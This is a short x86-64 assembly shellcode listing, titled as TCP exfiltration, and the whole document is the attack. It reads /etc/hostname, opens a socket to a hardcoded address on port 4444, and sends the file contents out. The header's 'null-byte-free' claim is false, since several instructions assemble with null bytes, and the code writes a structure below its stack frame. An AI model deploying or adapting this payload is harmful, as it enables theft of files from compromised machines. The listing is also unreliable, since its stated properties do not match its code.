
; TCP Exfiltration - Shellcode PIC (null-byte-free)
push rbp
mov rbp, rsp
sub rsp, 256

lea rdi, [rel filename]
xor rax, rax
mov al, 2
xor rsi, rsi
xor rdx, rdx
syscall

cmp rax, 0
jl exit_fail

mov r8, rax

mov rdi, r8
mov rsi, rbp
sub rsi, 256
mov rdx, 255
xor rax, rax
syscall
mov r9, rax

mov rdi, 2
mov rsi, 1
xor rdx, rdx
xor rax, rax
mov al, 41
syscall
mov r10, rax

lea rax, [rbp - 256 - 16]
mov word [rax], 2
mov word [rax + 2], 0x5c11
mov dword [rax + 4], 0x0a00a8c0

mov rdi, r10
mov rsi, rax
mov rdx, 16
xor rax, rax
mov al, 42
syscall

mov rdi, r10
mov rsi, rbp
sub rsi, 256
mov rdx, r9
xor rax, rax
mov al, 44
syscall

xor rdi, rdi
xor rax, rax
mov al, 60
syscall

exit_fail:
mov rdi, 1
xor rax, rax
mov al, 60
syscall

filename:
db "/etc/hostname", 0
